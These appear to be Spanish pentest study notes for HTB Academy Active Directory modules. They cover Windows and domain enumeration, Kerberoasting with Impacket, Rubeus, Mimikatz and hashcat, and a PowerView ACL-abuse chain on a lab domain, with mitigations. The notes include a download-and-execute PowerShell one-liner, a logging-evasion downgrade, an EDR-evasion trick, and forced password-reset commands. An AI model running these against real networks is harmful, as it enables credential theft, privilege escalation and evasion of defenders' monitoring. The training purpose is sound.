| `Get-ChildItem Env: \| ft Key,Value` | Devuelve variables de entorno como rutas, nombres de usuario, información del sistema, etc. |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Obtiene el historial de comandos de PowerShell del usuario. Puede contener información sensible como contraseñas o rutas de scripts. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <comandos>"` | Descarga y ejecuta un script directamente desde memoria usando PowerShell. Útil para ejecución sin tocar disco. |

#### Degradar Powershell
El registro de eventos de Powershell se introdujo como una característica con Powershell 3.0 y versiones posteriores. Con eso en mente, podemos intentar llamar a Powershell versión 2.0 o anterior. Si tiene éxito, nuestras acciones desde el shell no se registrarán en el Visor de eventos. 

```
Get-host #Observar la version actual de PowerShell
powershell.exe -version 2  #Verificar la degradacion de PowerShell
get-module  #Ejecutar comando con powershell 2.0
```

El lugar principal para buscar si estamos **escribiendo registros** es en el _PowerShell Operational Log_ encontrado debajo Applications and `Services Logs > Microsoft > Windows > PowerShell > Operational`. Todos los comandos ejecutados en nuestra sesión iniciarán sesión en este archivo. El Windows PowerShell registro ubicado en `Applications and Services Logs > Windows PowerShell` también es un buen lugar para comprobarlo

**Comprobaciones de Seguridad**
```
## Verificar si esta corriendo el Firewall

#Powershell
netsh advfirewall show allprofiles
#CMD
sc query windefend

#Verificar configuraciones especificas de AntiVirus
Get-MpComputerStatus

#Verificar si hay otro usuario actualmente en el host victima
qwinsta
```
### Network Information
| Comando | Descripción |
|---------|-------------|
| `arp -a` | Enumera todos los hosts conocidos almacenados en la tabla ARP. |
| `ipconfig /all` | Imprime la configuración del adaptador de red del host. Permite identificar el segmento de red. |
| `route print` | Muestra la tabla de enrutamiento (IPv4 e IPv6), identificando redes conocidas y rutas compartidas. |
| `netsh advfirewall show allprofiles` | Muestra el estado del firewall del host. Permite saber si está activo y si filtra el tráfico. |

### Windows Management Instrumentation (WMI)

Comandos WMIC para enumeración del sistema

[Cheeatsheet Comandos WMIC](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) 
[Documentacion WMIC](https://learn.microsoft.com/en-us/windows/win32/wmisdk/using-wmi)
| Comando | Descripción |
|---------|-------------|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Imprime el nivel del parche y la descripción de las revisiones aplicadas. |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Muestra información básica del host, incluyendo atributos como nombre, dominio, fabricante, modelo y roles. |
| `wmic process list /format:list` | Lista todos los procesos activos en el host. |
| `wmic ntdomain list /format:list` | Muestra información sobre el dominio y los controladores de dominio. |
| `wmic useraccount list /format:list` | Muestra información sobre todas las cuentas locales y cuentas de dominio que hayan iniciado sesión. |
| `wmic group list /format:list` | Muestra información sobre todos los grupos locales. |
| `wmic sysaccount list /format:list` | Vuelca información sobre cuentas del sistema utilizadas como cuentas de servicio. |

```
#Ver información sobre el dominio y el dominio secundario, y el bosque externo en el que nuestro dominio actual confía
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

### Net Commands
Estos comandos pueden ser beneficiosos para nosotros cuando intentamos enumerar información del dominio
Podemos enumerar información como:
- Usuarios locales y de dominio
- Grupos
- Anfitriones
- Usuarios específicos en grupos
- Controladores de dominio
- Requisitos de contraseña
> Se debe tener en cuenta que los comandos de _net.exe_ generalmente son monitoreados por soluciones EDR y pueden revelar rápidamente nuestra ubicación si nuestra evaluación tiene un componente evasivo.

**Comandos `net` para enumeración en redes Windows**

| Comando | Descripción |
|---------|-------------|
| `net accounts` | Muestra información sobre los requisitos de contraseña. |
| `net accounts /domain` | Muestra la política de contraseñas y bloqueo en el dominio. |
| `net group /domain` | Muestra información sobre los grupos del dominio. |
| `net group "Domain Admins" /domain` | Enumera los usuarios con privilegios de administrador de dominio. |
| `net group "domain computers" /domain` | Lista las computadoras unidas al dominio. |
| `net group "Domain Controllers" /domain` | Enumera las cuentas de los controladores de dominio. |
| `net group <domain_group_name> /domain` | Muestra los usuarios que pertenecen a un grupo específico del dominio. |
| `net groups /domain` | Lista todos los grupos del dominio. |
| `net localgroup` | Muestra todos los grupos locales del sistema. |
| `net localgroup administrators /domain` | Enumera los usuarios del grupo "Administrators" en el dominio. |
| `net localgroup Administrators` | Muestra información sobre el grupo local de administradores. |
| `net localgroup administrators [username] /add` | Agrega un usuario al grupo de administradores locales. |
| `net share` | Muestra los recursos compartidos actuales del sistema. |
| `net user <ACCOUNT_NAME> /domain` | Muestra información sobre un usuario específico del dominio. |
| `net user /domain` | Enumera todos los usuarios del dominio. |
| `net user %username%` | Muestra información sobre el usuario actual. |
| `net use x: \\computer\share` | Monta un recurso compartido de red como una unidad local. |
| `net view` | Muestra una lista de computadoras en la red local. |
| `net view /all /domain[:domainname]` | Muestra los recursos compartidos en todos los dominios especificados. |
| `net view \\computer /ALL` | Enumera los recursos compartidos en una computadora específica. |
| `net view /domain` | Muestra una lista de computadoras dentro del dominio. |

```
#Listado de grupos de dominio
net group /domain

#Informacion sobre un usuario de dominio
net user /domain wrouse

#Truco de evasion - Cambiando net por net1 es posible que no se detecten los comandos por el EDR
net1 user 
```

### Dsquery
Es una herramienta de línea de comandos que se puede utilizar para encontrar objetos de Active Directory, existira en un AD que tenga instalado _Active Directory Domain Services Role_ y que de forma predeterminada tiene una DLL en _C:\Windows\System32\dsquery.dll_

[Comodines de Dsquery](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11))

```
#Busqueda de usuarios
dsquery user

#Busqueda de hosts
dsquery computer

#Busqueda de comodines
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

#Usuarios con PASSWD_NOTREQD en userAccountControl - Combinando Dsquery con consultas LDAP
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

#Busqueda de controladores de dominio en el dominio actual (Imprimiendo max 5 resultados)
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

#
```
### LDAP Filtering Explained
LDAP (Lightweight Directory Access Protocol) permite realizar búsquedas avanzadas en Active Directory (AD) usando filtros. Estos filtros son muy potentes cuando se combinan con atributos como userAccountControl y reglas especiales llamadas OIDs (Object Identifiers).

Ejemplo LDAP
```
userAccountControl:1.2.840.113556.1.4.803:=8192
```
- `userAccountControl`: Es el atributo que estamos evaluando (controla cosas como si la cuenta está deshabilitada, requiere contraseña, etc.).

- `1.2.840.113556.1.4.803`: Es un OID que define cómo comparar el valor del atributo (en este caso, comparación exacta de bits).

- `=8192`: Es el valor en decimal del bit que queremos buscar (ej: 8192 = cuenta Smartcard requerida).

**Tipos de OID (Reglas de comparación)**

| OID                       | ¿Qué hace?                                                        | Uso común                                     |
| ------------------------- | ----------------------------------------------------------------- | --------------------------------------------- |
| `1.2.840.113556.1.4.803`  | Coincidencia exacta de bits                                       | Buscar un atributo específico                 |
| `1.2.840.113556.1.4.804`  | Coincidencia parcial (cualquier bit que coincida)                 | Buscar cualquier atributo activo entre varios |
| `1.2.840.113556.1.4.1941` | Coincidencia en la jerarquía (como pertenencia a grupos anidados) | Búsquedas relacionadas con `memberOf`         |

<img width="2576" height="1780" alt="image" src="https://github.com/user-attachments/assets/558046c4-5fbd-4faf-bc16-1f09f7676646" />

**Operadores lógicos**

| Operador | Significado | Ejemplo                             |     |                       |
| -------- | ----------- | ----------------------------------- | --- | --------------------- |
| `&`      | AND (y)     | `(&(objectClass=user)(UAC filter))` |     |                       |
| \`       | \`          | OR (o)                              | \`( | (filtro1)(filtro2))\` |
| `!`      | NOT (no)    | `(!(filtro))`                       |     |                       |

Ejemplos:

```
#Busca todos los objetos tipo usuario que tengan configurado el atributo "Password Can't Change"
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))

#Lo mismo, pero busca usuarios que no tienen ese atributo
(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
```
**Solucion Preguntas Modulo**
```
Get-ADUser -LDAPFilter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -Properties Description,MemberOf
```
___________________________________________________________________________________________-

## Kerberoasting - from Linux

Kerberoasting explota SPNs (Service Principal Names). Cualquier usuario del dominio puede solicitar tickets TGS para servicios con SPN; esos TGS están cifrados con el hash NTLM de la cuenta de servicio. Se extraen los TGS y se crakean offline (ej. Hashcat) para intentar recuperar la contraseña en claro de la cuenta de servicio y escalar lateralmente.

Los SPN son identificadores únicos que Kerberos utiliza para asignar una instancia de servicio a una cuenta de servicio en cuyo contexto se ejecuta el servicio

**Requisitos mínimos**

- Credenciales de usuario de dominio (cleartext) o hash NTLM o un shell con contexto de usuario de dominio / SYSTEM / keytab.
- IP o nombre del Domain Controller (<DC_IP> / DC.local).
- Herramientas: Impacket (GetUserSPNs.py), Hashcat (modo 13100), opcional CrackMapExec o similares, wordlists y GPU para cracking.

**Flujo resumido**

1. Enumerar cuentas con SPN en el dominio.
2. Solicitar (dump) los TGS para esas cuentas (todos o específicos).
3. Guardar los TGS a fichero para cracking offline.
4. Crakear los TGS con Hashcat (modo 13100).
5. Si se obtiene contraseña, validar y pivotar (p. ej. autenticarse a servicios, acceder a MSSQL, etc.).

**Comandos (Linux — sintaxis en bash)**

```
# (1) Instalar Impacket desde el repo clonado
sudo python3 -m pip install .

# (2) Listar SPNs (Necesita: Credenciales e IP del DC)
GetUserSPNs.py -dc-ip <DC_IP> DC.local/User
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# (3) Solicitar (dump) todos los TGS para cracking
GetUserSPNs.py -dc-ip <DC_IP> DC.local/User -request -outputfile all_tgs
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

# (4) Solicitar sólo el TGS de un usuario concreto y guardarlo
GetUserSPNs.py -dc-ip <DC_IP> DC.local/User -request-user User -outputfile User_tgs-txt
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs.txt

# (5) Cracking offline con Hashcat (Kerberos TGS etype 23 → modo 13100)
hashcat -m 13100 User_tgs.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 

# (6) Verificar autenticación con las credenciales descubiertas
sudo crackmapexec smb <DC_IP> -u User -p Password
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!

```

**Limitaciones importantes**

- Recuperar la contraseña depende de la fortaleza de la contraseña del account de servicio y de los recursos de cracking (GPU, wordlists, tiempo).
- Tickets TGS son costosos de crakear; si se usan contraseñas fuertes y políticas modernas (AES, contraseñas largas, gMSA), puede ser impracticable.
- Obtener TGS no da ejecución inmediata: se necesita crackear el hash para recuperar credenciales en claro o usar técnicas adicionales.

**Mitigaciones (alto nivel)**

- Usar Managed Service Accounts / gMSA y rotación automática de contraseñas.
- Políticas de contraseñas fuertes y long passphrases para cuentas de servicio.
- Monitorizar y alertar solicitudes masivas/anómalas de TGS (SIEM / detección de Kerberos abuse).
- Minimizar privilegios de cuentas de servicio (no añadir a Domain Admin / evitar memberships innecesarias).
- Habilitar protecciones Kerberos modernas (evitar RC4, usar AES, Kerberos armoring/FAST si aplica).

**Solucion preguntas**
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/SAPService
      Account Operators
```

## Kerberoasting - from Windows

### Kerberoasting - Semi Manual method

1. **Enumeración de SPN con setspn.exe**

```
setspn.exe -Q */*
```
2. **Solicitud de TGS a un usuario**
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
`Add-Type -AssemblyName System.IdentityModel`
- Agrega un ensamblado de .NET Framework a PowerShell, permitiendo usar clases de ese espacio de nombres.
(System.IdentityModel contiene clases para trabajar con tokens de seguridad.)

`New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <SPN>`
- Crea un objeto de tipo KerberosRequestorSecurityToken y solicita un ticket TGS para el SPN especificado (en este caso, MSSQLSvc/DEV-PRE-SQL...).

Esto solicita el ticket para el usuario desde la sesión actual, como lo hace Rubeus internamente.

También se pueden solicitar todos los tickets a la vez, pero esto incluiría cuentas de computadora, lo cual no es óptimo para Kerberoasting.

3. **Recuperar todos los tickets usando setspn.exe**

```
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
Ahora que los tickets están cargados, podemos usar Mimikatz para extraer los tikets de memory

4. **Extrayendo tickets de la memoria con Mimikatz**
If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files.
```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export  
```
5. **Preparing the Base64 Blob for Cracking**
El codigo debe estar en una sola linea asi que para arreglarlo se usa
```
echo "<base64 blob>" |  tr -d \\n 
```

Se guarda la linea obtenida en el paso anterior, se guarda en un archivo y se convierte a .kirbi

6. **Placing the Output into a File as .kirbi**
```
cat encoded_file | base64 -d > sqldev.kirbi
```

7. **Extracting the Kerberos Ticket using kirbi2john.py**

```
python2.7 kirbi2john.py sqldev.kirbi
```

8. **Modifiying crack_file for Hashcat**
Se modifica el archivo para poder usar hashcar
```
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

9. **Crackear Hash con HashCat**
```
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

### Automated / Tool Based Route

1. **Uso de PowerView para enumerar cuentas SPN**

```
# Importamos PowerView
Import-Module .\PowerView.ps1

# Enumeramos las cuentas con SPN
Get-DomainUser * -spn | select samaccountname
```

2. **Uso de PowerView para dirigirse a un usuario específico**

```
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

3. **Exportación de todos los tickets a un archivo CSV**}

```
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
cat .\ilfreight_tgs.csv
```

### Usando Rubeus

También podemos utilizar Rubeus desde GhostPack para realizar Kerberoasting aún más rápido y sencillo. Rubeus nos ofrece una variedad de opciones para realizar Kerberoasting.

```
.\Rubeus.exe
```
**Enumerar cuentas Kerberoasteables** - Clasificadas por tipo de cifrado

```
.\Rubeus.exe kerberoast /stats
```

**Solicitar cuentas de Administrador**
Solicitud de cuentas de administrador, especificando que la salida sea en formato Hashcataxax
```
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
  admincount=1 - Solicita hash de cuentas de administrador
  /nowrap      - Entrega la salida en una sola linea, para usar con Hashcat
```

**Solicitar Hash para una cuenta especifica de usuario**

```
.\Rubeus.exe kerberoast /ldapfilter:"(samAccountName=svc_vmwaresso)" /nowrap
```

**Mimikatz**
```
hashcat -m 13100 hash_PoweView.txt ../../../Wordlists/rockyou.txt
```

_______________________________________
**Tipos de Cifrado**
Las herramientas de Kerberoasting prefieren el cifrado RC4 (tipo 23) al solicitar TGS-REQ, ya que:

- RC4 es más débil y más fácil de romper con herramientas como Hashcat.
- Otros tipos como AES-128 (tipo 17) y AES-256 (tipo 18) son más seguros y más lentos de descifrar, pero siguen siendo vulnerables si la contraseña es débil.

Ejemplo:

1. Creamos un usuario con SPN: testspn
2. Usamos Rubeus para Kerberoasting:
```
.\Rubeus.exe kerberoast /user:testspn /nowrap
```
3. Se obtiene un ticket TGS cifrado con RC4 ($krb5tgs$23$*...)

Rubeus avisa que si la cuenta soporta AES, devolverá hashes AES a menos que se use /ticket:X o /tgtdeleg para forzar RC4.
4. Confimacion con PowerView
> El atributo msDS-SupportedEncryptionTypes = 0 → usa RC4 por defecto (no se definió tipo de cifrado específico)
```
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

5. Solicitud de TGS de cifrado debil - Degradando el tipo de cifrado?
Se puede agregar el /tgtdeleg para que solo entregue los hashes de los usuarios kerberoasteables con cifrado RC34 (Tipo 23) 
```
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
/tgtdeleg
```
> Cabe recalcar que la respuesta es diferente dependiendo de la version del Windows Server

### Mitigación y detección

Para mitigar Kerberoasting, use cuentas de servicio administradas (MSA/gMSA) en lugar de cuentas con contraseñas fijas. Estas generan contraseñas complejas que rotan automáticamente.

Habilite la auditoría de tickets TGS (eventos 4769 y 4770) para detectar actividad anómala. Un número elevado de solicitudes 4769 en poco tiempo puede indicar un ataque.

Evite el uso de RC4 y no asigne SPN a cuentas privilegiadas. Pruebe cambios antes de aplicarlos en producción.

___________________________________________________________________________________

## Access Control List (ACL) Abuse Primer

### Access Control List (ACL) Overview
Las ACL definen quién tiene acceso a qué recurso y con qué nivel. Cada objeto en Active Directory posee una ACL compuesta de varias ACE (Access Control Entries).  
Existen dos tipos de ACL:
- DACL (Discretionary ACL): especifica permisos concedidos o denegados a un objeto.
- SACL (System ACL): registra intentos de acceso a objetos para auditoría.  
Una configuración errónea puede dar privilegios excesivos o innecesarios a usuarios y grupos, generando un riesgo de seguridad.

### Access Control Entries (ACEs)
Una ACE define permisos de un usuario o grupo sobre un objeto.  
Tipos de ACE:
- Access Denied ACE: niega explícitamente acceso.
- Access Allowed ACE: concede explícitamente acceso.
- System Audit ACE: genera registros de auditoría.  

Cada ACE contiene: el SID del usuario/grupo, el tipo de ACE, opciones de herencia hacia objetos hijos y una máscara de acceso con los derechos concedidos.  
Ejemplos de permisos abusables:
- ForceChangePassword → restablecer contraseñas sin conocer la anterior.
- GenericWrite → modificar atributos de un objeto (ej. asignar SPN para Kerberoasting).
- AddSelf → agregarse a grupos de seguridad.
- GenericAll → control total sobre el objeto (resetear contraseñas, modificar membresías, leer LAPS, etc.).

### Why are ACEs Important?
Las ACE pueden ser aprovechadas por atacantes para moverse lateral o verticalmente, establecer persistencia o lograr control total del dominio.  
Son difíciles de detectar mediante herramientas tradicionales, suelen permanecer años sin revisarse y representan vectores útiles cuando las configuraciones más obvias ya fueron corregidas.  
Herramientas como BloodHound y PowerView permiten enumerar y visualizar estas relaciones para explotación.

### ACL Attacks in the Wild
Los abusos de ACL pueden servir para:
- Movimiento lateral
- Escalada de privilegios
- Persistencia  

Escenarios comunes:
- Abusar de permisos de restablecimiento de contraseñas asignados a Help Desk.
- Abusar de derechos de gestión de grupos para añadirse a grupos privilegiados.
- Derechos excesivos heredados de instalaciones de software o configuraciones antiguas.  

Existen muchos otros casos menos comunes, pero la metodología de enumeración con herramientas de AD debe ser flexible para detectar nuevos privilegios.  
Siempre se debe contar con aprobación del cliente antes de ejecutar cambios, documentar todo el proceso y revertir cualquier modificación realizada.


## ACL Enumeration

### Enumerating ACLs with PowerView

Enumerar que usuarios tienen derechos ACL interesante que podamos aprovechar
```
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley    #Configuracion para que el SID busque de manera efectiva

Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}    #Realizar Busqueda especifica (GUID no legible 00299570-246d-11d0-a768-00aa006e0529) - Se úede averiguar en internet
  # $sid -Busqueda por SID (Usuario esecifico)
  # SecurityIdentifier -Dice quien tiene derecho obre un objeto

#Salida entendible para Humanos
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

```
Es importante tener en cuenta que, si buscamos sin la opción ResolveGUIDs, veremos resultados como el siguiente, donde el comando ExtendedRight no nos indica claramente qué entrada ACE tiene el usuario sobre damundsen. Esto se debe a que la propiedad ObjectAceType devuelve un valor GUID ilegible.


### Enumerating ACLs with CMDLETS (Sin herramientas)

**Traducir GUID sin Herramientas**

Arreglando la salida con una busqueda inversa y reasignación del GUID (Si ya se importo PowerView, lo ideal seria ejectar lo siuiente en otro PowerShell)
```
$guid= "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

**Enumeración de ACL sin Herramientas**

```
#Crear lista de usuarios del dominio
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

#Iterar con un bucle For Each - Se recorre cada linea del txt, se extrae los derechos de acceso (Access Property) y luego con IdentityReference buscamos los derechos de nuestro usuario
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

#Enumeracion de derechos ACL de un usuario especifico "damunsen"
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose

  ObjectDN: CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL  #CN es el nombre del objeto sobre el cual se tiene derechos
  ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite #Derechos que el usuario tiene sobre los objetos

#Enumerar derechos del grupo Help Desk Level 1
Get-DomainObjectAcl -Identity "Help Desk Level 1" -ResolveGUIDs | Format-Table -AutoSize

#Verificar los grupos anidados a los que pertenece para ver que derechos hereda
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof

  CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```
**GenericWrite**
Sobre un Usuario
- Agregar un SPN → Kerberoasting
- Modificar atributos (como scriptPath, description, etc.)

Sobre un Grupo
- Agregar o quitar miembros

Que se acaba de hacer:
- We have control over the user wley whose hash we retrieved earlier in the module (assessment) using Responder and cracked offline using Hashcat to reveal the cleartext password value
- We enumerated objects that the user wley has control over and found that we could force change the password of the user damundsen
- From here, we found that the damundsen user can add a member to the Help Desk Level 1 group using GenericWrite privileges
- The Help Desk Level 1 group is nested into the Information Technology group, which grants members of that group any rights provisioned to the Information Technology group

Continuando
```
#Enumerar derechos del grupo anidado
$itgroupsid = Convert-NameToSid "Information Technology"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

  ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
  ActiveDirectoryRights : GenericAll

#
$adunnsid = Convert-NameToSid adunn
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

  ObjectDN: DC=INLANEFREIGHT,DC=LOCAL
  ObjectAceType: DS-Replication-Get-Changes-In-Filtered-Set
  ObjectAceType: DS-Replication-Get-Changes
```
El resultado anterior muestra que nuestro adunn el usuario tiene DS-Replication-Get-Changes y DS-Replication-Get-Changes-In-Filtered-Set derechos sobre el objeto de dominio. Esto significa que se puede aprovechar a este usuario para realizar un ataque DCSync.

Information Technology grupo tiene **GenericAll** derechos sobre el usuario adunn, lo que significa que podríamos:
- Modificar la membresía del grupo
- Forzar el cambio de contraseña
- Realice un ataque Kerberoasting dirigido e intente descifrar la contraseña del usuario si es débil

### Enumerating ACLs with BloodHound
1. Primero con la informacion recopilada con SharpHound y ya cargada en BloodHound

```
#Ejecutar SharpHound desde el host de ataque (dentro del dominio)
.\SharpHound.exe -c All --zipfilename NombreArchivo
```

2. En "Node Info" (Para usar nuestro usuario como nodo) vamos al apatado "Outbound Control Rights" para visualizar los objetos sobre los cuales tenemos control directo y la cantidad de posibles objeos que podriamos llegar a controlar con rutas de ataque a ACL presionando sobre "Transitive Object Control"
El "First Degree Object Control" nos muestra el primer conjunto de derechos

3. Si presionamos click derecho y vamos a "Help" se nos proporcionara informacion sobre:
- Más información sobre el derecho específico, las herramientas y los comandos que se pueden utilizar para llevar a cabo este ataque
- Consideraciones sobre seguridad operativa (Opsec)
- Referencias externas.

4.   Si presionamos sobre el valor de "Transitive Object Control" es mostrara la cadena de ataque que se llevo en el apartado anterior, donde con el menú de ayuda podriamos llevar a cabo cada ataque

5.  Uso de consultas prediseñadas de BloodHound en la seccion de "Analysis" para verificar que el usuario que "adunn" tiene derechos DCSync

<img width="1027" height="761" alt="image" src="https://github.com/user-attachments/assets/5aa1c582-174e-4bcd-a923-c413a961e98e" />

Obtener el ObjectAceType de usuario sobre Grupo (Solucion pregunta HTB Academy)
```
#Primero importar el PowerView
Get-ObjectAcl -Identity "<NombreExactoDelGrupo>" -ResolveGUIDs |
Where-Object { $_.SecurityIdentifier -eq "<SID_de_forend>" } |
Select-Object IdentityReference, ObjectAceType, ActiveDirectoryRights
```

## ACL Abuse Tactics
Con base a lo que se tiene y se ha enumerado (Usuario wley obtenido con Hash NTLMv2 y los permisos de cambio de contraseña que este tiene sobre Adunn)
1. Utilice el wley usuario para cambiar la contraseña del damundsen usuario
2. Autenticarse como el damundsen usuario y apalancamiento GenericWrite derechos para agregar un usuario que controlamos al Help Desk Level 1 grupo
3. Aproveche la membresía de grupos anidados en el Information Technology grupo y apalancamiento GenericAll derechos para tomar el control de la adunn usuario

1. **Cambio de contraseña**
```
#Crea un objeto con la contraseña de wley, forsando a que sea un objeto seguro para poder utilizarlo en PowerShell (Aun siendo texto plano)
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force

#Objeto que sirve para autenticarse como wley - Util para trabajar con PowerView
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

#Se crea un objeto con las nuevas credenciales para el usuario damundsen (Todavia sin asignar)
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

#Se efectua el cambio de contraseña con PowerView para damundsen proporcionandole el objeto de la nueva contraseña y especificando el objeto de las credenciales de quien cambia la contraseña
cd C:\Tools\
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
El cambio de contraseñas se puede realizar igualmente desde la maquina Linux del atacante, usando la herramienta **pth-net** del [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
```
pth-net rpc password DC.local/wley:Password123@DC -U DC.local/wley -N 'damundsen' -P 'Pwn3d_by_ACLs!'
  pth-net use DC.local/damundsen:Pwn3d_by_ACLs!@DC  #Verificar Autenticacion
```
2. **Autenticacion con damundsen y Agregarnos al Help Desk Level 1** A traves de los permisos de GenericAll

```
#Inicio de sesion (Creacion de objetos seguros, con contraseña y credenciales de usuario)
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

#Luego se comprueba si el usuario no es miembro del grupo objetivo (Tambien se peude hacer con pth-toolkit)
#?Get-DomainGroupMember -Identity "Help Desk Level 1" -Recurse | Where-Object { $_.MemberName -match "damundsen" }
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

pth-net rpc groupmem DC.local/damundsen:Pwn3d_by_ACLs!@DC "Help Desk Level 1"
  pth-net rpc addmem DC.local/damundsen:Pwn3d_by_ACLs!@DC "Help Desk Level 1" damundsen #Agregar a damundsen al grupo objetivo

#Agregar damundsen al grupo Help Desk Level 1
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

#Comprobacion de que realmente se agrego al grupo
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

```
El cliente pide que no cambiemos la contraseña de adunn ya que es administrador (Lo cual podriamos hacer ya que tenemos permisos de GenericAll que tenmos en Help Desk Level 1 y que la heredamos del grupo de Tecnology Information)
Lo que se va hacer es abusar de los ACL (GenericAll) para crear un SPN falso en la cuenta de adunn para convertirlo en un objetivo Kerberoasteable (Aunque antes no lo fuera)

**Creando un SPN falso**
```
#Con PowerView insertamos un "servicePrincipalName" ficticio en la cuenta ibjetivo
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

#Luego se hace un ataque comun de Kerberoast al usuario adunn
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

### Cleanup
Ya que tenemos el hash y lo desciframos con HashCat hay que limpiar el rastro que dejamos, para lo cual seguimos estos pasos

1. Elimine el SPN falso que creamos en el adunn usuario.
2. Retire el damundsen usuario de la Help Desk Level 1 grupo
3. Establezca la contraseña para el damundsen el usuario vuelve a su valor original (si lo conocemos) o hace que nuestro cliente lo configure/alerte al usuario
Este orden es importante porque si eliminamos primero al usuario del grupo, entonces no tendremos los derechos para eliminar el SPN falso.

```
#Eliminar SPN falso
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

#Eliminar a damundsen del grupo Help Desk Level 1
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

#Confirmacion de la eliminacion del usuario
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```
### Detection and Remediation

- Auditoría y limpieza: Revisar periódicamente Active Directory y eliminar ACL peligrosas con herramientas como BloodHound.
- Monitoreo de grupos: Vigilar cambios en grupos críticos del dominio para detectar intentos de abuso.
- Monitoreo de cambios en ACL:
